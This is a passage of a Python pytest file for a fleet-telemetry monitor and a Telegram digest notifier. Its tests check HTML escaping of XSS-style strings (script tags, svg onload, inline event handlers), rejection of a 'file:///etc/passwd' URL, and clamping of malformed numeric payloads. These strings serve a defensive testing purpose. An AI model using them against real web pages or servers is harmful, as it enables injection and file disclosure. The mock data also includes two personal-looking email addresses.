    digest = notifier.format_hourly_digest(scan_result)

    # Invariants: No raw unescaped dangerous tags or event handlers in executable contexts
    assert "<script" not in digest
    assert "</script" not in digest
    assert "<svg" not in digest
    assert "<img" not in digest
    assert "<b onclick" not in digest

    # Invariants: Properly escaped HTML entities are present
    assert "&lt;script&gt;alert(&#x27;node&#x27;)&lt;/script&gt;&amp;" in digest
    assert "model&lt;b onclick=&quot;bad()&quot;&gt;&quot;&#x27;" in digest
    assert "&lt;svg/onload=" in digest
    assert "pro&quot; autofocus onfocus=&quot;alert(1)" in digest
    assert "pro-starved-&lt;b&gt;1&lt;/b&gt;" in digest

    # Verify truncate_telegram_html maintains tag balance without crashing
    safe_digest = notifier.truncate_telegram_html(digest, max_chars=1000)
    assert len(safe_digest) <= 1000
    assert "<script" not in safe_digest


def test_epoch_ceiling_classifies_astronomical_finite_timestamp_as_malformed():
    """Nebula Cycle 36 Guard: Finite astronomical timestamps > EPOCH_CEILING (2100-01-01)
    must be classified as malformed_rejected rather than future_rejected.
    """
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    now = 1770000000.0  # ~2026

    summary_resp = json.dumps({"online_nodes": 10, "total_nodes": 10}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 95.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({"nodes": [{"name": "n1", "tier": "pro", "requests_served": 1, "quota_weekly_consumed": 1000, "active_jobs": 0}]}).encode("utf-8")

    jobs_list = [
        # Normal job within 1h
        {"job_id": "normal-1", "node_name": "n1", "model": "m", "total_tokens": 100, "created_at": now - 300.0},
        # Legitimate future within 60s slack: now + 30.0 -> accepted
        {"job_id": "slack-ok", "node_name": "n1", "model": "m", "total_tokens": 200, "created_at": now + 30.0},
        # Future clock skew beyond slack (e.g. 2 hours in future): now + 7200.0 (< EPOCH_CEILING) -> future_rejected
        {"job_id": "skew-future", "node_name": "n1", "model": "m", "total_tokens": 400, "created_at": now + 7200.0},
        # Astronomical finite timestamp (year 2150): 4733510400.0 > EPOCH_CEILING -> malformed_rejected
        {"job_id": "astronomical-year-2150", "node_name": "n1", "model": "m", "total_tokens": 800, "created_at": 4733510400.0},
    ]
    jobs_resp = json.dumps({"jobs": jobs_list}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh(now_ts=now)

    anomalies = res.get("window_anomalies", {})
    assert anomalies["future_rejected"] == 1  # skew-future
    assert anomalies["malformed_rejected"] == 1  # astronomical-year-2150
    assert res["total_jobs_tokens_1h"] == 300  # normal-1 (100) + slack-ok (200)


def test_double_entry_token_reconciliation_telemetry():
    """Double-Entry Ledger Invariant (Nebula Cycle 36 Recommendation):
    When reconcile_tokens=True, cross-check jobs ledger against node quota counterparty account
    and emit reconciliation divergence metrics without breaking existing behavior.
    """
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    now = 1770000000.0

    summary_resp = json.dumps({"online_nodes": 5, "total_nodes": 5}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 90.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({
        "nodes": [
            {"name": "balanced-node", "tier": "pro", "requests_served": 5, "quota_weekly_consumed": 50000, "active_jobs": 0},
            {"name": "divergent-node", "tier": "pro", "requests_served": 2, "quota_weekly_consumed": 0, "active_jobs": 0},
        ]
    }).encode("utf-8")

    jobs_list = [
        {"job_id": "j1", "node_name": "balanced-node", "model": "m", "total_tokens": 1500, "created_at": now - 100.0},
        {"job_id": "j2", "node_name": "divergent-node", "model": "m", "total_tokens": 2500, "created_at": now - 200.0},
    ]
    jobs_resp = json.dumps({"jobs": jobs_list}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        # 1. By default reconcile_tokens is False -> res["reconciliation"] is None
        res_default = detector.check_stream_5_fleet_mesh(now_ts=now)
        assert res_default["reconciliation"] is None

        # 2. When reconcile_tokens=True -> res["reconciliation"] is populated
        res_reconciled = detector.check_stream_5_fleet_mesh(now_ts=now, reconcile_tokens=True)
        rec = res_reconciled["reconciliation"]
        assert rec is not None
        assert rec["jobs_stream_tokens_1h"] == 4000
        assert rec["fleet_weekly_tokens"] == 50000

        div = rec["reconciliation_divergence"]
        assert div["balanced-node"]["jobs_1h_tokens"] == 1500
        assert div["balanced-node"]["weekly_tokens"] == 50000
        assert div["balanced-node"]["divergence"] is False

        assert div["divergent-node"]["jobs_1h_tokens"] == 2500
        assert div["divergent-node"]["weekly_tokens"] == 0
        assert div["divergent-node"]["divergence"] is True


def test_numeric_validation_and_saturating_ceiling_cwe20():
    """Nebula Cycle 37 Remediation:
    - Scientific notation overflow (e.g. '1e500') must return 0, not raise, not become inf.
    - Negative values must be clamped to min_val (default 0).
    - NaN and Inf must return default (0).
    - Extreme astronomical values (e.g. 10**50) must saturate at MAX_TELEMETRY_VALUE (1<<40).
    """
    assert _safe_int("1e500") == 0
    assert _safe_int("1e-5") == 0
    assert _safe_int("-100") == 0
    assert _safe_int(-500) == 0
    assert _safe_int(float("nan")) == 0
    assert _safe_int(float("inf")) == 0
    assert _safe_int(float("-inf")) == 0
    assert _safe_int("not_a_number") == 0

    # Saturating ceiling
    assert _safe_int(10**50) == MAX_TELEMETRY_VALUE
    assert _safe_int(1 << 45) == MAX_TELEMETRY_VALUE
    assert _safe_int(1000) == 1000

    # Float counterpart
    assert _safe_float("1e500") == 0.0
    assert _safe_float("-10.5") == 0.0
    assert _safe_float(float("nan")) == 0.0
    assert _safe_float(float("inf")) == 0.0
    assert _safe_float(10**50) == float(MAX_TELEMETRY_VALUE)


def test_fetch_rejects_file_scheme_and_applies_timeout():
    """Nebula Cycle 37 Remediation:
    - URL scheme validation must strictly allow only http/https, rejecting file:, ftp:, etc. (CWE-918).
    - urlopen must be invoked with an explicit bounded timeout (CWE-400).
    """
    # 1. Scheme rejection
    with pytest.raises(ValueError, match="Only http and https are permitted"):
        _validate_fleet_url("file:///etc/passwd")

    with pytest.raises(ValueError, match="Only http and https are permitted"):
        _validate_fleet_url("ftp://example.com/test")

    with pytest.raises(ValueError, match="Fleet URL must be a non-empty string"):
        _validate_fleet_url("")

    # 2. Timeout verification
    mock_resp = MagicMock()
    mock_resp.read.return_value = b'{"status": "ok"}'
    mock_resp.__enter__.return_value = mock_resp

    with patch("urllib.request.urlopen", return_value=mock_resp) as mock_urlopen:
        res = _safe_fetch_json("http://localhost:7777/test", timeout=12.5)
        assert res == {"status": "ok"}
        assert mock_urlopen.called
        _, kwargs = mock_urlopen.call_args
        assert kwargs.get("timeout") == 12.5


def test_reconciliation_divergence_above_threshold_flags():
    """Nebula Cycle 37 Remediation:
    Assert that divergence (underreporting tokens when jobs exist) produces actionable flags
    divergence_flagged, divergent_nodes, and window_anomalies['reconciliation_divergence'].
    """
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    now = 1770000000.0

    summary_resp = json.dumps({"online_nodes": 5, "total_nodes": 5}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 90.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({
        "nodes": [
            {"name": "clean-node", "tier": "pro", "requests_served": 5, "quota_weekly_consumed": 50000, "active_jobs": 0},
            {"name": "divergent-node", "tier": "pro", "requests_served": 2, "quota_weekly_consumed": 0, "active_jobs": 0},
        ]
    }).encode("utf-8")

    jobs_list = [
        # Normal job
        {"job_id": "j1", "node_name": "clean-node", "model": "m", "total_tokens": 1500, "created_at": now - 100.0},
        # Divergent job: non-zero job tokens, but node reported 0 weekly quota
        {"job_id": "j2", "node_name": "divergent-node", "model": "m", "total_tokens": 2500, "created_at": now - 200.0},
        # Poison payload: scientific notation overflow & negative tokens
        {"job_id": "j3", "node_name": "clean-node", "model": "m", "total_tokens": "1e500", "created_at": now - 300.0},
        {"job_id": "j4", "node_name": "clean-node", "model": "m", "total_tokens": -9999, "created_at": now - 400.0},
    ]
    jobs_resp = json.dumps({"jobs": jobs_list}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh(now_ts=now, reconcile_tokens=True)

    # 1. Total tokens in 1h correctly filters/clamps poisoned payloads (1500 + 2500 + 0 + 0 = 4000)
    assert res["total_jobs_tokens_1h"] == 4000

    # 2. Reconciliation divergence flagged
    rec = res["reconciliation"]
    assert rec is not None
    assert rec["divergence_flagged"] is True
    assert rec["divergence_count"] == 1
    assert rec["divergent_nodes"] == ["divergent-node"]

    # 3. window_anomalies includes reconciliation_divergence
    anomalies = res.get("window_anomalies", {})
    assert anomalies["reconciliation_divergence"] == 1


def test_2303_11366_invariant(tmp_path):
    """Reflexion (arXiv:2303.11366) Episodic Self-Reflection Buffer & Ultra Node Isolation Invariant:
    1. Verifies deterministic episodic dedup ledger state transition S_{t+1} = delta(S_t, E)
       with SHA-256 content digest indexing and mode-0600 atomic persistence.
    2. Verifies that Ultra-tier nodes ('innoria-team' / 'innoria.team@gmail.com' and 'ariana' / 'lthn.ariana@gmail.com')
       are strictly isolated from the Pro candidate pool in Stream 5 telemetry, never inflating
       total_pro_nodes or starved_pro_nodes even under malformed tier payloads.
    """
    import hashlib
    import stat

    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-reflexion-token\n", encoding="utf-8")
    ledger_file = tmp_path / "reflexion_dedup_ledger.json"

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        ledger_path=ledger_file,
    )

    # Part A: Episodic memory state transition S_{t+1} = delta(S_t, E)
    now_ts = time.time()
    episode_key = "reflexion_episode_2303_11366"
    episode_text = "Episodic reflection: isolate innoria-team (Ultra) from Pro quota burn pool"
    expected_sha256 = hashlib.sha256(episode_text.encode("utf-8")).hexdigest()

    assert notifier._is_dedup_suppressed(episode_key, text=episode_text) is False
    notifier._record_dedup_success(episode_key, now_ts, text=episode_text)

    # Verify deterministic state transition in memory & on disk (0600 permissions)
    assert notifier._is_dedup_suppressed(episode_key, text=episode_text) is True
    assert expected_sha256 in notifier._recent_sends
    assert ledger_file.exists()
    file_mode = stat.S_IMODE(ledger_file.stat().st_mode)
    assert file_mode == 0o600

    # Part B: Ultra node isolation ('innoria-team' & 'ariana') in Stream 5 Pro-First evaluation
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    summary_resp = json.dumps({"online_nodes": 5, "total_nodes": 5}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 96.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps({
        "nodes": [
            {"name": "innoria-team", "tier": "ultra", "account_email": "innoria.team@gmail.com", "requests_served": 2, "quota_weekly_capacity": 7000000, "quota_weekly_consumed": 50000, "quota_weekly_percent": 99.3, "active_jobs": 0},
            {"name": "ariana", "tier": "ultra", "account_email": "lthn.ariana@gmail.com", "requests_served": 4, "quota_weekly_capacity": 7000000, "quota_weekly_consumed": 62526, "quota_weekly_percent": 99.1, "active_jobs": 0},
            {"name": "binhthuong", "tier": "pro", "requests_served": 120, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 2100000, "quota_weekly_percent": 16.0, "active_jobs": 0},
            {"name": "sunward", "tier": "pro", "requests_served": 115, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 2050000, "quota_weekly_percent": 18.0, "active_jobs": 0},
        ]
    }).encode("utf-8")
    jobs_resp = json.dumps({
        "jobs": [
            {"job_id": "j-pro-1", "node_name": "binhthuong", "model": "gemini-3.8-flash-high", "total_tokens": 12000, "created_at": now_ts - 60.0},
            {"job_id": "j-pro-2", "node_name": "sunward", "model": "claude-sonnet-4-6", "total_tokens": 15000, "created_at": now_ts - 30.0},
        ]
    }).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh(now_ts=now_ts)

    pfc = res["pro_first_criterion"]
    assert pfc["total_pro_nodes"] == 2
    assert "innoria-team" not in pfc["starved_pro_nodes"]
    assert "ariana" not in pfc["starved_pro_nodes"]
    assert pfc["grade"] == "OPTIMAL"
    assert pfc["status"] == "PASS"


# ==============================================================================
# Sovereign Hold (Streams 1, 2, 3), Clean Task Prompt & Deep Insight Tests
# ==============================================================================
def test_streams_1_2_3_on_hold_and_excluded_from_health_penalty(tmp_path):
    """Verify Streams 1, 2, 3 marked ON_HOLD do not penalize entropy_health_score."""
    missing_stock = tmp_path / "missing_stock.db"
    missing_legal = tmp_path / "missing_legal"
    missing_media = tmp_path / "missing_media.json"

    median_log = tmp_path / "median.log"
    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    median_log.write_text(
        f"[{now_str}] Running check 1\n[{now_str}] Hourly Sync completed successfully\n",
        encoding="utf-8",
    )

    detector = EntropyDegradationDetector(
        stock_db_path=missing_stock,
        legal_dir_path=missing_legal,
        media_json_path=missing_media,
        median_log_path=median_log,
        held_streams={1, 2, 3},
    )

    with patch.object(
        detector,
        "check_stream_5_fleet_mesh",
        return_value={"name": "AGY Fleet Mesh & Council", "status": "HEALTHY", "score": 100},
    ):
        scan_res = detector.scan()

    streams = scan_res["streams"]
    assert streams[0]["status"] == "ON_HOLD"
    assert streams[1]["status"] == "ON_HOLD"
    assert streams[2]["status"] == "ON_HOLD"
    assert streams[3]["status"] == "HEALTHY"
    assert streams[4]["status"] == "HEALTHY"
    # Even though Streams 1, 2, 3 files are missing (raw score 0), they are ON_HOLD so active score is 100!
    assert scan_res["entropy_health_score"] == 100
    assert scan_res["active_streams_count"] == 2
    assert scan_res["held_streams_count"] == 3


def test_paused_cron_jobs_ignored_by_anomaly_detector(mock_executions_db, mock_ticker_heartbeat, tmp_path):
    """Verify paused/disabled jobs in jobs.json are excluded from clogged, drift, overdue, auth, and rate-limit checks."""
    jobs_file = tmp_path / "jobs_paused.json"
    past_time = (datetime.now(timezone.utc) - timedelta(hours=2)).isoformat()
    future_time = (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat()

    data = {
        "version": 1,
        "jobs": [
            {
                "id": "job_clogged_1",
                "name": "stock-news-crawler",
                "enabled": False,
                "state": "paused",
                "paused_reason": "On Hold per Sovereign Directive",
                "drift_alerted": True,
                "next_run_at": past_time,
                "last_error": "[drift_skip:model_changed] HTTP 503: [codex] [429]: usage limit reached",
            },
            {
                "id": "job_overdue_1",
                "name": "legal-crawler",
                "enabled": False,
                "state": "paused",
                "next_run_at": past_time,
                "last_error": "Token refresh failed: invalid_grant",
            },
            {
                "id": "job_healthy",
                "name": "webhook-health",
                "enabled": True,
                "next_run_at": future_time,
                "last_error": None,
            },
        ],
    }
    jobs_file.write_text(json.dumps(data), encoding="utf-8")

    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=jobs_file,
        heartbeat_path=mock_ticker_heartbeat,
    )
    scan_res = detector.scan()
    assert scan_res["clogged_jobs"] == []
    assert scan_res["drift_skipped_jobs"] == []
    assert scan_res["overdue_jobs"] == []
    assert scan_res["auth_failed_jobs"] == []
    assert scan_res["rate_limited_jobs"] == []
    assert scan_res["paused_jobs_count"] == 2
    assert scan_res["active_jobs_count"] == 1
    assert scan_res["cron_health_score"] == 100


def test_clean_task_prompt_unwraps_clef_json_and_xml():
    """Verify _extract_clean_task_prompt strips Clef JSON, XML, and Codex wrappers cleanly."""
    # Case 1: Clef Gemini JSON wrapper
    json_wrapped = {
        "prompt": json.dumps(
            {
                "system_directive": "Sovereign Execution Agent",
                "task_specification": "Audit Pro Fleet QBRR quota balance across 17 Pro nodes",
                "constraints": ["Zero-Fake-Pass"],
            }
        )
    }
    assert (
        _extract_clean_task_prompt(json_wrapped)
        == "Audit Pro Fleet QBRR quota balance across 17 Pro nodes"
    )

    # Case 2: Clef Claude XML wrapper
    xml_wrapped = {
        "prompt": "<context>Hermes Router</context><task>Fix unresolved model None in autonomous_worker.py</task><constraints>Strict</constraints>"
    }
    assert (
        _extract_clean_task_prompt(xml_wrapped)
        == "Fix unresolved model None in autonomous_worker.py"
    )

    # Case 3: Codex markdown wrapper
    codex_wrapped = {
        "prompt": "### Context\nRouter\n### Objective\nVerify lxc container zencode-router service\n### Constraints\nNone"
    }
    assert (
        _extract_clean_task_prompt(codex_wrapped)
        == "Verify lxc container zencode-router service"
    )


def test_digest_includes_efficiency_pro_fleet_and_evolutionary_significance():
    """Verify format_hourly_digest renders Operational Efficiency, Pro/Ultra Fleet Telemetry, ON_HOLD streams, and Evolutionary Significance."""
    now_ts = time.time()
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
        held_streams={1, 2, 3},
    )

    summary_resp = json.dumps({"online_nodes": 19, "total_nodes": 19}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 98.0, "sla_passed": True}).encode("utf-8")
    nodes_resp = json.dumps(
        {
            "nodes": [
                {
                    "name": "innoria-team",
                    "tier": "ultra",
                    "account_email": "innoria.team@gmail.com",
                    "requests_served": 3,
                    "quota_weekly_capacity": 7000000,
                    "quota_weekly_consumed": 50000,
                    "quota_weekly_percent": 99.3,
                    "active_jobs": 0,
                    "status": "healthy",
                },
                {
                    "name": "ariana",
                    "tier": "ultra",
                    "account_email": "lthn.ariana@gmail.com",
                    "requests_served": 5,
                    "quota_weekly_capacity": 7000000,
                    "quota_weekly_consumed": 65000,
                    "quota_weekly_percent": 99.1,
                    "active_jobs": 0,
                    "status": "healthy",
                },
                {
                    "name": "sunward",
                    "tier": "pro",
                    "requests_served": 85,
                    "quota_weekly_capacity": 2500000,
                    "quota_weekly_consumed": 1800000,
                    "quota_weekly_percent": 28.0,
                    "active_jobs": 0,
                    "status": "healthy",
                },
            ]
        }
    ).encode("utf-8")
    jobs_resp = json.dumps(
        {
            "jobs": [
                {
                    "job_id": "job-ok-1",
                    "node_name": "sunward",
                    "model": "gemini-3.8-flash-medium",
                    "status": "completed",
                    "total_tokens": 33465,
                    "latency_ms": 28400,
                    "created_at": now_ts - 120.0,
                    "prompt": json.dumps(
                        {"task_specification": "Synthesize Pro Fleet and Evolutionary Insights"}
                    ),
                },
                {
                    "job_id": "job-fail-1",
                    "node_name": "sunward",
                    "model": "gemini-3.8-flash-high",
                    "status": "failed",
                    "error": "Job timed out after 300.0s",
                    "total_tokens": 0,
                    "latency_ms": 300000,
                    "created_at": now_ts - 600.0,
                    "prompt": "Timeout diagnostic job",
                },
            ]
        }
    ).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        s5 = detector.check_stream_5_fleet_mesh(now_ts=now_ts)

    assert "operational_efficiency" in s5
    assert s5["operational_efficiency"]["completed_jobs"] == 1
    assert s5["operational_efficiency"]["timeout_jobs"] == 1
    assert "pro_fleet_insight" in s5
    assert "ultra_fleet_insight" in s5
    assert s5["ultra_fleet_insight"]["gemini_only_invariant"] is True
    assert "evolution_insight" in s5

    scan_result = {
        "overall_health_score": 100,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "active_jobs_count": 4,
            "paused_jobs_count": 18,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "overdue_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 12.0},
        },
        "entropy": {
            "entropy_health_score": 100,
            "streams": [
                {
                    "name": "Stock News Feed",
                    "status": "ON_HOLD",
                    "hold_reason": "On Hold per Sovereign Directive",
                    "hours_since_crawl": 0.5,
                    "articles_24h": 42,
                    "unique_symbols": 12,
                },
                s5,
            ],
        },
    }

    notifier = HermesTelegramNotifier(env_file=Path("/nonexistent/.env"), target_chat_id=TEST_CHAT_ID)
    html_out = notifier.format_hourly_digest(scan_result)
    assert "Hiệu Quả Vận Hành" in html_out
    assert "Sức Khỏe Cụm Pro Fleet" in html_out
    assert "Ý Nghĩa Tiến Hoá" in html_out
    assert "ON_HOLD" in html_out
    assert "Synthesize Pro Fleet and Evolutionary Insights" in html_out
    assert "task_specification" not in html_out
    assert len(html_out) < 4096


def test_significant_gravitas_autogpt_pattern(
    tmp_path, mock_executions_db, mock_jobs_json, mock_ticker_heartbeat
):
    """Significant-Gravitas/AutoGPT Goal Decomposition, Bounded Context & Health Clamping Invariant:
    1. Audits CronAnomalyDetector.scan() sub-goal anomaly classification across clogged, drift-skipped,
       overdue, auth-failed, and rate-limited state vectors.
    2. Verifies _extract_clean_task_prompt unwraps multi-layer nested JSON metaprompts and enforces
       bounded memory/context window M(t) <= M_max via HermesTelegramNotifier._safe_format_prompt.
    3. Verifies CompositeHealthCalculator.calculate state transitions across HEALTHY, WARNING, and
       CRITICAL regimes with strict [0, 100] clamping under extreme boundary inputs (-500, 99999).
    """
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    scan_res = detector.scan()
    assert len(scan_res["clogged_jobs"]) == 1
    assert scan_res["clogged_jobs"][0]["job_id"] == "job_clogged_1"
    assert len(scan_res["drift_skipped_jobs"]) == 1
    assert len(scan_res["overdue_jobs"]) == 1
    assert len(scan_res["auth_failed_jobs"]) == 1
    assert len(scan_res["rate_limited_jobs"]) == 1
    assert 0 <= scan_res["cron_health_score"] <= 100

    nested_metaprompt = {
        "prompt": json.dumps(
            {
                "$schema": "https://hermes.sovereign/clef/v1",
                "task": {
                    "raw_instructions": json.dumps(
                        {
                            "task_specification": "Decompose autonomous goal G into bounded sub-goals g_1..g_k and verify convergence"
                        }
                    )
                },
            }
        )
    }
    clean_goal = _extract_clean_task_prompt(nested_metaprompt)
    assert clean_goal == "Decompose autonomous goal G into bounded sub-goals g_1..g_k and verify convergence"
    m_max = 48
    bounded_goal = HermesTelegramNotifier._safe_format_prompt(clean_goal, limit=m_max)
    assert len(bounded_goal) <= m_max

    score_ok, sev_ok = CompositeHealthCalculator.calculate(100, 100, 100, 100)
    assert score_ok == 100 and sev_ok == "HEALTHY"
    score_warn, sev_warn = CompositeHealthCalculator.calculate(65, 70, 75, 80)
    assert 60 <= score_warn < 85 and sev_warn == "WARNING"
    score_crit, sev_crit = CompositeHealthCalculator.calculate(15, 25, 30, 0)
    assert 0 <= score_crit < 60 and sev_crit == "CRITICAL"

    score_low, sev_low = CompositeHealthCalculator.calculate(-500, -500, -500, -500)
    assert score_low == 0 and sev_low == "CRITICAL"
    score_high, sev_high = CompositeHealthCalculator.calculate(99999, 99999, 99999, 99999)
    assert score_high == 100 and sev_high == "HEALTHY"


def test_all_hands_ai_openhands_pattern(tmp_path):
    """All-Hands-AI/OpenHands Event-Sourced Trajectory Deduplication & Poison-Pill Boundary Guard Invariant:
    1. Verifies HermesTelegramNotifier event-sourced SHA-256 trajectory deduplication, mode 0o600
       atomic ledger persistence, and cross-instance reload durability.
    2. Verifies poison-pill numeric boundary guards (_safe_int, _safe_float, _safe_pct) against
       NaN, Inf, negative underflow (-999), and overflow saturation (MAX_TELEMETRY_VALUE * 10).
    """
    import stat

    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-openhands-token\n", encoding="utf-8")
    ledger_file = tmp_path / "openhands_trajectory_ledger.json"

    notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        ledger_path=ledger_file,
    )

    now_ts = time.time()
    event_text = "OpenHands trajectory event: sandbox action execution verified"
    event_key = notifier._dedup_key(event_text)
    expected_sha256 = hashlib.sha256(event_text.encode("utf-8")).hexdigest()

    assert notifier._is_dedup_suppressed(event_key, text=event_text) is False
    notifier._record_dedup_success(event_key, now_ts, text=event_text)
    assert notifier._is_dedup_suppressed(event_key, text=event_text) is True
    assert expected_sha256 in notifier._recent_sends
    assert ledger_file.exists()
    assert stat.S_IMODE(ledger_file.stat().st_mode) == 0o600

    reloaded_notifier = HermesTelegramNotifier(
        env_file=env_file,
        target_chat_id=TEST_CHAT_ID,
        ledger_path=ledger_file,
    )
    assert reloaded_notifier._is_dedup_suppressed(event_key, text=event_text) is True
    assert event_key in reloaded_notifier._read_ledger()

    assert _safe_int(float("nan"), default=7) == 7
    assert _safe_int(float("inf"), default=7) == 7
    assert _safe_int(-999) == 0
    assert _safe_int(MAX_TELEMETRY_VALUE * 10) == MAX_TELEMETRY_VALUE

    assert _safe_float(float("nan"), default=3.5) == 3.5
    assert _safe_float(float("inf"), default=3.5) == 3.5
    assert _safe_float(-999.0) == 0.0
    assert _safe_float(float(MAX_TELEMETRY_VALUE * 10)) == float(MAX_TELEMETRY_VALUE)

    assert _safe_pct(float("nan"), 100) == 0.0
    assert _safe_pct(50, float("inf")) == 0.0
    assert _safe_pct(-999, 100) == 0.0
    assert _safe_pct(25, 0) == 0.0
    assert _safe_pct(MAX_TELEMETRY_VALUE * 10, MAX_TELEMETRY_VALUE) == 100.0


def test_wheresryan22_anatomy_ecology_integration_invariant():
    """wheresryan22/anatomy Ecology Integration & 4-Vector Sovereign Bridge Verification Invariant:
    1. Verifies that `.agents/skills/anatomy/SKILL.md` and `.agents/skills/anatomy/kit/audit.mjs` exist on disk.
    2. Executes `node --test tests/test_anatomy_sovereign_bridge.test.mjs` via subprocess.run and verifies
       zero-defect completion (returncode == 0) across all 4 Mandatory Adversarial Verification Vectors.
    """
    repo_root = Path(__file__).resolve().parent.parent
    skill_md = repo_root / ".agents" / "skills" / "anatomy" / "SKILL.md"
    audit_mjs = repo_root / ".agents" / "skills" / "anatomy" / "kit" / "audit.mjs"
    bridge_test = repo_root / "tests" / "test_anatomy_sovereign_bridge.test.mjs"

    assert skill_md.is_file(), f"Missing Anatomy SKILL.md at {skill_md}"
    assert audit_mjs.is_file(), f"Missing Anatomy kit/audit.mjs at {audit_mjs}"
    assert bridge_test.is_file(), f"Missing bridge test at {bridge_test}"

    proc = subprocess.run(
        ["node", "--test", str(bridge_test)],
        cwd=str(repo_root),
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    assert proc.returncode == 0, (
        f"Anatomy Sovereign Bridge test failed (rc={proc.returncode}):\n"
        f"STDOUT:\n{proc.stdout}\nSTDERR:\n{proc.stderr}"
    )
    assert "pass 4" in proc.stdout or "fail 0" in proc.stdout


def test_hourly_digest_task_efficiency_pro_ultra_dual_quota_jev_and_7am_sleep_report(tmp_path):
    """Verify:
    1. _extract_clean_task_prompt unwraps <task_dispatch>, <objective>, <user_request>, <raw_prompt>, <context>, <constraints>.
    2. check_stream_5_fleet_mesh filters 17 Google AGY Pro nodes (excluding oc_*, ineligible, disabled, zencode-ent),
